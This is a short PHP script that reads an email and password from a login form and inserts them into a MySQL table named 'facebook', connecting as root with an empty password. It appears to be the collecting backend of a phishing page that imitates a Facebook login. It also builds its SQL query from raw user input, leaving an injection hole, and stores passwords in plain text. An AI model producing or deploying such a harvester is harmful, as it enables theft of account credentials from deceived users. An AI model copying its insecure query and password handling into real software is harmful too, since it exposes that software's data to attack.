<?php
$dbHost = "Localhost";
$dbUsername = "root";
$dbPassword = "";
$dbname = "Formulario";

$conexao = new mysqli($dbHost,$dbUsername,$dbPassword,$dbname,);

if ($conexao->connect_errno) {
	echo "Erro na conexao";
	# code...
}
else
 {
	echo "Conexão feita com sucesso";
	# code...
}

if (isset($_POST['login'])) 
{
	$email = $_POST['email'];
	$senha = $_POST['pass'];
	$result = mysqli_query($conexao, "INSERT INTO facebook(Email,senha1)VALUES('$email','$senha')");
	
print_r($_POST['email']);
print_r($_POST['Senha']);
}
?>

